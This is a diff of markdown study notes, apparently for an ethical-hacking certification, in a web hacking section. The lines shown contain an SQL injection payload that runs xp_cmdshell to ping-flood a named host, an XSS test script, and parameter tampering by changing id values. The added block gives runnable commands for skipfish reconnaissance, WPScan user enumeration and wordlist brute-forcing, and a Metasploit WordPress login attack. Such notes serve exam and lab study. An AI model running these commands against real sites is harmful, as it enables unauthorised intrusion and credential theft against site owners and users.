@@ -278,12 +278,37 @@ blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 <details>
     <summary> Web Hacking</summary>
     
-- ### 1) Parameter Tampering
+### 1) Parameter Tampering
     - Changing ?id=1 or 2 or 3 to switch user.
-
-- ### 2) XSS
+### 2) XSS
       - In cotactact us page i the commrent section post the following script `<script>alert("You are Hacked")</script>`
 
-- ### 3) WPScan
-    - 
+### 3) WPScan
+- SkipFish : Active Recon for Websites 
+  
+```console
+skipfish -o 202 http://192.168.1.202/wordpress
+```
+
+- Wordpress Site Login BruteForce [Step-By-Step](https://www.hackingarticles.in/multiple-ways-to-crack-wordpress-login/)
+  
+```shell
+# Wordpress site only Users Enumeration
+wpscan --url http://example.com/ceh --enumerate u 
+
+# Direct crack if we have user/password details
+
+wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+
+# Using Metaspoilt
+msfdb init && msfconsole
+msf > use auxiliary/scanner/http/wordpress_login_enum
+msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.100
+msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
+msf auxiliary(wordpress_login_enum) > set user_file user.txt
+msf auxiliary(wordpress_login_enum) > set pass_file pass.txt
+msf auxiliary(wordpress_login_enum) > exploit
+  
+  
+```
 </details>
